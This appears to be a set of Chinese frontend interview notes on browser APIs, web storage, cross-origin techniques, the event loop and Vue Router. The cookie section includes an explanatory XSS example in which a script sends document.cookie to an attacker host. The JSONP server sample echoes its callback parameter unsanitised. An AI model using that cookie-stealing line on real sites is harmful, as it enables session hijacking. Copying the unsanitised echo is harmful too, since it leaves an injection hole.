## 目录
- [目录](#目录)
- [link标签有什么作用](#link标签有什么作用)
  - [相关资料](#相关资料)
  - [面试回答](#面试回答)
- [iframe 有那些缺点？](#iframe-有那些缺点)
- [统计当前页面出现次数最多的标签](#统计当前页面出现次数最多的标签)
  - [相关代码](#相关代码)
- [如何找到当前页面出现次数前三多的 HTML 标签 最小堆](#如何找到当前页面出现次数前三多的-html-标签-最小堆)
  - [相关代码](#相关代码-1)
- [跨域](#跨域)
- [图片懒加载](#图片懒加载)
  - [在vant 中使用了2种实现方式的兼容处理](#在vant-中使用了2种实现方式的兼容处理)
- [cookie、sessionStorage与localStorage有何区别](#cookiesessionstorage与localstorage有何区别)
  - [相关资料](#相关资料-1)
  - [面试回答](#面试回答-1)
- [浏览器中监听事件函数 addEventListener 第三个参数有那些值](#浏览器中监听事件函数-addeventlistener-第三个参数有那些值)
- [什么是事件委托，e.currentTarget 与 e.target 有何区别](#什么是事件委托ecurrenttarget-与-etarget-有何区别)
- [DOM 中如何阻止事件默认行为，如何判断事件否可阻止？](#dom-中如何阻止事件默认行为如何判断事件否可阻止)
- [在浏览器中如何获取剪切板中内容](#在浏览器中如何获取剪切板中内容)
- [浏览器的剪切板中如何监听复制事件](#浏览器的剪切板中如何监听复制事件)
- [如何实现页面文本不可复制](#如何实现页面文本不可复制)
- [如何取消请求的发送](#如何取消请求的发送)
- [如何理解 JS 的异步？](#如何理解-js-的异步)
  - [相关资料](#相关资料-2)
  - [面试回答](#面试回答-2)
- [阐述一下 JS 的事件循环](#阐述一下-js-的事件循环)
  - [面试回答](#面试回答-3)
- [JS 中的计时器能做到精确计时吗？为什么？](#js-中的计时器能做到精确计时吗为什么)
  - [相关资料](#相关资料-3)
  - [面试回答](#面试回答-4)
- [二篇文章让你彻底搞懂浏览器的渲染机制](#二篇文章让你彻底搞懂浏览器的渲染机制)
- [异步加载 JS 脚本时，async 与 defer 有何区别](#异步加载-js-脚本时async-与-defer-有何区别)
- [Vue 中的 router 实现原理如何](#vue-中的-router-实现原理如何)
- [浏览器中如何读取二进制信息](#浏览器中如何读取二进制信息)


## link标签有什么作用

### 相关资料

1. 样式表

   ```html
   <link href="main.css" rel="stylesheet" />
   ```

2. 网站图标

   ```html
   <link rel="icon" href="favicon.ico" />
   ```

3. 你也可以在 `media` 属性中提供媒体类型或查询；这种资源将只在满足媒体条件的情况下才会加载。

   ```html
   <link
     href="mobile.css"
     rel="stylesheet"
     media="screen and (max-width: 600px)" />
   ```

4. 预加载资源

   ```html
   <link
     rel="preload"
     href="myFont.woff2"
     as="font"
     type="font/woff2"
     crossorigin="anonymous" />
   ```

   ```html
   <!doctype html>
   <html lang="en-US">
     <head>
       <meta charset="utf-8" />
       <title>Basic JavaScript module example</title>
       <link rel="modulepreload" href="main.js" />
       <link rel="modulepreload" href="modules/canvas.js" />
       <link rel="modulepreload" href="modules/square.js" />
       <style>
         canvas {
           border: 1px solid black;
         }
       </style>
   
       <script type="module" src="main.js"></script>
     </head>
     <body></body>
   </html>
   
   ```

   

5. DNS 预解析、网站预链接

   ```html
   <link rel="dns-prefetch" href="https://fonts.googleapis.com" />
   ```

   ```html
   <link rel="preconnect" href="https://cdn.example.com" crossorigin />
   ```

6. 资源完整性校验（Integrity）

   ```html
   <link rel="preload" href="script.js" integrity="sha256-..." />
   ```

   

### 面试回答

其核心作用在于资源的链接与优化，比如

1. 资源加载相关

   加载样式表、网站图标

2. 性能优化

   preload 预加载资源，比如脚本、字体、图片

   DNS 预解析、网站预链接

3. 安全增强

   资源完整性校验（Integrity）

##  iframe 有那些缺点？



## 统计当前页面出现次数最多的标签

### 相关代码

```javascript
const getMostTag = () => {
    const allDoms = document.querySelectorAll("*")

    const map = new Map()

    Array.from(allDoms).forEach((item) => {
        const elementNameCount = map.get(item.tagName)
        if (elementNameCount) {
            map.set(item.tagName, elementNameCount+1)
        }
        else {
            map.set(item.tagName, 1)
        }
    })
    console.log("map", map)
    const res = map.entries().reduce(([key1, value1], [key2, value2]) => {
        return value1 >= value2 ? [key1, value1] : [key2, value2]
    })
    return res[0]
}
getMostTag()

```

## 如何找到当前页面出现次数前三多的 HTML 标签 最小堆

### 相关代码

```javascript
const getTopThreeTag=()=>{
    const allDoms = document.querySelectorAll("*")

    const map = new Map()

    Array.from(allDoms).forEach((item) => {
        const elementNameCount = map.get(item.tagName)
        if (elementNameCount) {
            map.set(item.tagName, elementNameCount+1)
        }
        else {
            map.set(item.tagName, 1)
        }
    })
    console.log('map is',map)
    const minHeap=[]
    map.entries().forEach(([key,value])=>{
        minHeap.push({key,value})
        minHeap.sort((a,b)=>b.value-a.value)
        if(minHeap.length>3){
            minHeap.pop()
        }
    })
    return minHeap
}
getTopThreeTag()
```

## 跨域

**协议**，**域名**，**端口**，三者有一不一样，就是跨域

目前有两种最常见的解决方案：

1. CORS，在服务器端设置几个响应头，如 `Access-Control-Allow-Origin: *`

2. Reverse Proxy，在 nginx/traefik/haproxy 等反向代理服务器中设置为同一域名,***在本地dev代理时，需注意发出的请求域名一定是本地的域名才能代理成功，比如localhost***

3. JSONP

   ```javascript
   JSONP 实现完整代码:
   
   function stringify (data) {
     const pairs = Object.entries(data)
     const qs = pairs.map(([k, v]) => {
       let noValue = false
       if (v === null || v === undefined || typeof v === 'object') {
         noValue = true
       }
       return `${encodeURIComponent(k)}=${noValue ? '' : encodeURIComponent(v)}`
     }).join('&')
     return qs
   }
   
   function jsonp ({ url, onData, params }) {
     const script = document.createElement('script')
   
     // 一、为了避免全局污染，使用一个随机函数名
     const cbFnName = `JSONP_PADDING_${Math.random().toString().slice(2)}`
     // 二、默认 callback 函数为 cbFnName
     script.src = `${url}?${stringify({ callback: cbFnName, ...params })}`
     // 三、使用 onData 作为 cbFnName 回调函数，接收数据
     window[cbFnName] = onData;
   
     document.body.appendChild(script)
   
   ```

   **JSONP 服务端适配相关代码:**

   ```javascript
   const http = require('http')
   const url = require('url')
   const qs = require('querystring')
   
   const server = http.createServer((req, res) => {
     const { pathname, query } = url.parse(req.url)
     const params = qs.parse(query)
   
     const data = { name: 'shanyue', id: params.id }
   
     if (params.callback) {
       str = `${params.callback}(${JSON.stringify(data)})`
       res.end(str)
     } else {
       res.end()
     }
   
   })
   
   server.listen(10010, () => console.log('Done'))
   ```

## 图片懒加载

### 在vant 中使用了2种实现方式的兼容处理

1. [[Intersection_Observer_API](https://developer.mozilla.org/zh-CN/docs/Web/API/Intersection_Observer_API)](https://developer.mozilla.org/zh-CN/docs/Web/API/Intersection_Observer_API)
2. 监听图片父元素滚动时图片是否在可视区，如果在可视区，则new image 去加载图片的URL,完成后替换src

## cookie、sessionStorage与localStorage有何区别

### 相关资料

1. 使用方式

cookie：第一次用户端浏览器在发送请求后，服务器端会在回应的标头中，添加一个`Set-Cookie` 的选项并将 cookie 放入到回应中，送回用户浏览器端后，会储存在用户端本地。此外 cookie 会在用户浏览器下一次发送请求时，一同被携带并发送回服务器上。

localStorage、sessionStorage：这两者都是使用`键与值(key-value)` 的方式储存在用户本地端。

2. 生命周期

   cookie：可以透过 `Expires` 标明失效时间、或 `Max-Age` 标明有效时间长度，没有设置的话，预设是关闭浏览器之后失效。

   localStorage：除非在用户端被手动删除，或是代码清除，否则将永久保存。

   sessionStorage：在每次关闭该页面、或是关闭浏览器后就会自动被清除。

3. 存储大小

   cookie 数据大小不能超过4 k 。
   sessionStorage 和 localStorage 虽然也有存储大小的限制，但比 cookie 大得多，可以达到 5M 或更大。

4.  作用域

     sessionStorage  只在同源的同窗口（或标签页）中共享数据，也就是只在当前会话中共享。这里需要注意的是，页面及标 签页仅指顶级窗口，如果一个标签页包含多个iframe标签且他们属于同源页面，那么他们之间是可以共享sessionStorage的
     localStorage    在所有同源窗口中都是共享的。
     cookie          在所有同源窗口中都是共享的。

5. Cookie安全

   cookie 因为会被自动夹带在 HTTP 请求中，传送给服务器，因此需要考量到安全性的问题。

   - `Secure`：加上 Secure 可以确保只有在以加密的请求透过 HTTPS 协议时，才会传送给服务器。
   - `HttpOnly`：加上`HttpOnly`， 可以避免 JavaScript 的`Document.cookie`方法取得`HttpOnly cookies`，此方法可以避免跨站脚本攻击([XSS ](https://developer.mozilla.org/en-US/docs/Glossary/Cross-site_scripting))。
   - SameSite:控制Cookie在**跨站点请求**中的发送行为，防御CSRF（跨站请求伪造）攻击

   XSS攻击中Cookie窃取与伪造请求的典型示例

   1. 注入恶意脚本
      攻击者通过存在XSS漏洞的输入点（如评论框、URL参数、文件上传）注入恶意JavaScript代码

   ```
   <script>
     fetch('https://attacker.com/steal?cookie=' + document.cookie);
   </script>
   ```

   2. 窃取用户Cookie
      当受害者访问含恶意脚本的页面时，浏览器自动执行代码，通过`document.cookie`获取当前域下的Cookie，并发送至攻击者控制的服务器

   3. 伪造请求
      攻击者利用窃取的Cookie模拟受害者身份，向目标网站发起请求（如修改账户信息、转账等）

6. 单点登录

   - cookie+session
   - 双token，登录token和刷新token，认证中心返回2个token，

### 面试回答

cookie 、localStorage 和 sessionStorage3中都是前端常用的存储方式。

一、从使用方式来说cookie是后端设置的，其它两个则是前端。

二、从生命周期上来说，cookie可以设置有效时间、localStorage是永久有效、sessionStorage则是关闭该页面、或是关闭浏览器被清除。

三、从存储大小来说，cookie只有4k,而其他2个则有5M或更大。

四、从作用域上来说，sessionStorage只有在同源并且同标签页中才能共享，如果有多个嵌套的同源iframe也行，其它2个则是同源多标签页共享。

五、cookie的安全问题，后端可以设置HttpOnly防止前端可以获取cookie，同时设置Secure和SameSite来阻止HTTP请求携带cookie和阻止当前页跨站点请求携带cookie

六、可以用cookie做单点登录

## 浏览器中监听事件函数 [addEventListener](https://developer.mozilla.org/zh-CN/docs/Web/API/EventTarget/addEventListener) 第三个参数有那些值

1. passive
2. capture
3. once
4. signal

[addEventListener](https://developer.mozilla.org/zh-CN/docs/Web/API/EventTarget/addEventListener)

## 什么是事件委托，e.currentTarget 与 e.target 有何区别

事件委托指当有大量子元素触发事件时，将事件监听器绑定在父元素进行监听，此时数百个事件监听器变为了一个监听器，提升了网页性能。

区别：

- `e.target`是事件对象（Event对象）中的一个属性，它指向的是触发事件的原始元素。在事件冒泡和事件捕获阶段，`e.target`始终表示最初接收事件的那个元素
- `e.currentTarge`t也是事件对象中的一个属性，它表示当前正在处理事件的元素。它指向的是绑定事件处理程序的元素。

## DOM 中如何阻止事件默认行为，如何判断事件否可阻止？

- `e.preventDefault()`: 取消事件
- `e.cancelable`: 事件是否可取消

如果 `addEventListener` 第三个参数 `{ passive: true}`，`preventDefault` 将会会无效

## 在浏览器中如何获取剪切板中内容

1. Document.execCommand()方法

复制操作

```javascript
const inputElement = document.querySelector('#input');
inputElement.select();
document.execCommand('copy');
```

粘贴操作

```javascript
const pasteText = document.querySelector('#output');
pasteText.focus();
document.execCommand('paste');
```

缺点

- 只能将选中的内容复制到剪贴板，无法向剪贴板任意写入内容。
- 其次，它是同步操作，如果复制/粘贴大量数据，页面会出现卡顿。有些浏览器还会跳出提示框，要求用户许可，这时在用户做出选择前，页面会失去响应。
- 在PC端，可以复制文件和图片，但在移动端，无法复制图片

2.  `Clipboard API` 

Clipboard API 是下一代的剪贴板操作方法，比传统的document.execCommand()方法更强大、更合理。

它的所有操作都是异步的，返回 Promise 对象，不会造成页面卡顿。而且，它可以将任意内容（比如图片）放入剪贴板。

由于用户可能把敏感数据（比如密码）放在剪贴板，允许脚本任意读取会产生安全风险，所以这个 API 的安全限制比较多。

```javascript
// 是否能够有读取剪贴板的权限
// result.state == "granted" || result.state == "prompt"
const result = await navigator.permissions.query({ name: "clipboard-read" });
 
// 获取剪贴板内容
const text = await navigator.clipboard.readText();
```

如果要使用该API，需要注意的是 

- 兼容性：如果navigator.clipboard属性返回undefined，就说明当前浏览器不支持这个 API。
- 只有 HTTPS 协议的页面才能使用这个 API。不过，开发环境（localhost）允许使用非加密协议。
- 其次，调用时需要明确获得用户的许可。权限的具体实现使用了 Permissions API，跟剪贴板相关的有两个权限：clipboard-write（写权限）和clipboard-read（读权限）。"写权限"自动授予脚本，而"读权限"必须用户明确同意给予。也就是说，写入剪贴板，脚本可以自动完成，但是读取剪贴板时，浏览器会弹出一个对话框，询问用户是否同意读取。

[[剪贴板操作](https://www.ruanyifeng.com/blog/2021/01/clipboard-api.html)](https://www.ruanyifeng.com/blog/2021/01/clipboard-api.html)

## 浏览器的剪切板中如何监听复制事件

用户向剪贴板放入数据时，将触发`copy`事件。

```javascript
const clipboardItems = [];

document.addEventListener('copy', async (e) => {
  e.preventDefault();
  try {
    let clipboardItems = [];
    for (const item of e.clipboardData.items) {
      if (!item.type.startsWith('image/')) {
        continue;
      }
      clipboardItems.push(
        new ClipboardItem({
          [item.type]: item,
        })
      );
      await navigator.clipboard.write(clipboardItems);
      console.log('Image copied.');
    }
  } catch (err) {
    console.error(err.name, err.message);
  }
});
```



## 如何实现页面文本不可复制

有 CSS 和 JS 两种方法禁止复制

使用 CSS 如下：

```css
user-select: none;
```

或使用 JS 如下，监听 `selectstart` 事件，禁止选中。

当用户选中一片区域时，将触发 `selectstart` 事件，Selection API 将会选中一片区域。禁止选中区域即可实现页面文本不可复制。

```javascript
document.body.onselectstart = e => {  
  e.preventDefault();
}
 
document.body.oncopy = e => {  
  e.preventDefault();
}
```

## 如何取消请求的发送

1. XHR 使用 `xhr.abort()`

   ```javascript
   const xhr = new XMLHttpRequest(),
     method = "GET",
     url = "https://developer.mozilla.org/";
   xhr.open(method, url, true);
    
   xhr.send();
    
   // 取消发送请求
   xhr.abort();
   ```

2. [[fetch](https://developer.mozilla.org/zh-CN/docs/Web/API/AbortController)](https://developer.mozilla.org/zh-CN/docs/Web/API/AbortController)

3. Axios 有2种方式取消请求

   - cancelToken:底层实际是调用XMLHttpRequest 的xhr.abort()方法（兼容性好，但是标记废弃）
   - AbortController：调用方式类似（可能有兼容性问题）

   可以利用取消请求的功能封装axios,让其支持取消重复请求的功能

   具体实现原理：

   1. 设置全局的map,key是请求的唯一标识,可以根据URL+methods+data生成，value是每次请求新建的AbortController实例
   2. 在请求拦截时，先从全局的map查找有没有匹配的key,如果命中，则中断上一个请求，移除map映射，然后为当前请求生成key和AbortController实例，收集到map中
   3. 在响应拦截时，从map中移除相关请求

   

## 如何理解 JS 的异步？

### 相关资料

代码在执行过程中，会遇到一些无法立即处理的任务，比如：

- 计时完成后需要执行的任务 —— `setTimeout`、`setInterval`
- 网络通信完成后需要执行的任务 -- `XHR`、`Fetch`
- 用户操作后需要执行的任务 -- `addEventListener`

如果让渲染主线程等待这些任务的时机达到，就会导致主线程长期处于「阻塞」的状态，从而导致浏览器「卡死」

![image-20220810104344296](http://mdrs.yuanjin.tech/img/202208101043348.png)

**渲染主线程承担着极其重要的工作，无论如何都不能阻塞！**

因此，浏览器选择**异步**来解决这个问题

![image-20220810104858857](http://mdrs.yuanjin.tech/img/202208101048899.png)

使用异步的方式，**渲染主线程永不阻塞**

### 面试回答

JS是一门单线程的语言，这是因为它运行在浏览器的渲染主线程中，而渲染主线程只有一个。

而渲染主线程承担着诸多的工作，渲染页面、执行 JS 都在其中运行。

如果使用同步的方式，就极有可能导致主线程产生阻塞，从而导致消息队列中的很多其他任务无法得到执行。这样一来，一方面会导致繁忙的主线程白白的消耗时间，另一方面导致页面无法及时更新，给用户造成卡死现象。

所以浏览器采用异步的方式来避免。具体做法是当某些任务发生时，比如计时器、网络、事件监听，主线程将任务交给其他线程去处理，自身立即结束任务的执行，转而执行后续代码。当其他线程完成时，将事先传递的回调函数包装成任务，加入到消息队列的末尾排队，等待主线程调度执行。

在这种异步模式下，浏览器永不阻塞，从而最大限度的保证了单线程的流畅运行。

## 阐述一下 JS 的事件循环

### 面试回答

事件循环又叫做消息循环，是浏览器渲染主线程的工作方式。

在 Chrome 的源码中，它开启一个死循环，每次循环从消息队列中取出第一个任务执行，而其他线程只需要在合适的时候将任务加入到队列末尾即可。

过去把消息队列简单分为宏队列和微队列，这种说法目前已无法满足复杂的浏览器环境，取而代之的是一种更加灵活多变的处理方式。

根据 W3C 官方的解释，每个任务有不同的类型，同类型的任务必须在同一个队列，不同的任务可以属于不同的队列。不同任务队列有不同的优先级，在一次事件循环中，由浏览器自行决定取哪一个队列的任务。但浏览器必须有一个微队列，微队列的任务一定具有最高的优先级，必须优先调度执行。

## JS 中的计时器能做到精确计时吗？为什么？

### 相关资料

实现一个相对精准的倒计时

```
const newSetTimout = (callback: () => void, time: number) => {
    const timeoutIdObj: { timeoutId?: NodeJS.Timeout } = {
        timeoutId: undefined,
    }

    const startTime = new Date().getTime()
    let count = 0
    const innerSetTimeout = () => {
        count++
        // 理论时间
        const theoreticalTime = startTime + 100 * count
        // 实际时间
        const realTime = new Date().getTime()
        // 理论时间-实际时间
        const diffTime = realTime - theoreticalTime
        if (count * 100 >= time) {
            callback()
        } else {
            timeoutIdObj.timeoutId = setTimeout(innerSetTimeout, 100 - diffTime)
        }
    }
    timeoutIdObj.timeoutId = setTimeout(innerSetTimeout, 100)
    return timeoutIdObj
}
export default newSetTimout
```



### 面试回答

不行，因为：

1. 计算机硬件没有原子钟，无法做到精确计时
2. 操作系统的计时函数本身就有少量偏差，由于 JS 的计时器最终调用的是操作系统的函数，也就携带了这些偏差
3. 按照 W3C 的标准，浏览器实现计时器时，如果嵌套层级超过 5 层，则会带有 4 毫秒的最少时间，这样在计时时间少于 4 毫秒时又带来了偏差
4. 受事件循环的影响，计时器的回调函数只能在主线程空闲时运行，因此又带来了偏差

实现一个比较精准的倒计时

包装一个setTimeout,把倒计时时间分成整数个100毫秒的倒计时去执行，每次递归前判断理论时间和实际时间有没有差别，如果有，下次倒计时的时候100-差值做校准



## 二篇文章让你彻底搞懂浏览器的渲染机制

[[渲染页面：浏览器的工作原理](https://developer.mozilla.org/zh-CN/docs/Web/Performance/How_browsers_work)](https://developer.mozilla.org/zh-CN/docs/Web/Performance/How_browsers_work)

[[浏览器的回流与重绘 (Reflow & Repaint)](https://juejin.cn/post/6844903569087266823)](https://juejin.cn/post/6844903569087266823)



## 异步加载 JS 脚本时，async 与 defer 有何区别

[[一张图看懂async和defer区别](https://gist.github.com/jakub-g/385ee6b41085303a53ad92c7c8afd7a6)](https://gist.github.com/jakub-g/385ee6b41085303a53ad92c7c8afd7a6)

![async-defer](https://html.spec.whatwg.org/images/asyncdefer.svg)

而 `defer` 与 `async` 的区别如下:

- 相同点: **异步加载 (fetch)**
- 不同点:
  - async 加载(fetch)完成后立即执行 (execution)，因此可能会阻塞 DOM 解析；
  - defer 加载(fetch)完成后延迟到 DOM 解析完成后才会执行(execution)**，但会在事件 `DomContentLoaded` 之前

## Vue 中的 router 实现原理如何

大概流程 拿history模式举例

1. 新建history对象，通过base和URL解析出当前的跳转路径，同时监听[popstate](https://developer.mozilla.org/en-US/docs/Web/API/Window/popstate_event)事件***注意popstate只能监听到go、back事件***[popstate](https://developer.mozilla.org/en-US/docs/Web/API/Window/popstate_event)

2. 新建router实例，通过传入的路由递归遍历生成matchers数组和相对应matcherMap,遍历过程中将path解析成tokens,然后动态拼接成正则，这样就可以通过URL和matchers数组精确匹配到父子组件，同时也可以根据name和matcherMap拿到父子组件。初始化一个响应式的当前路由对象注入到整个app
3. 注册routerLink和routerView组件，routerView组件可以通过当前路由对象的matched获取匹配到的父子组件数组，同时通过注入deep深度默认0,渲染加一依次渲染每一个routerView组件
4. 路由跳转通过负值当前的响应式路由对象，可以做到routerView组件响应式渲染，然后通过history.pushState/replaceState保存路由堆栈记录

## 浏览器中如何读取二进制信息

![](https://shanyue.tech/assets/img/transform.77175c26.jpg)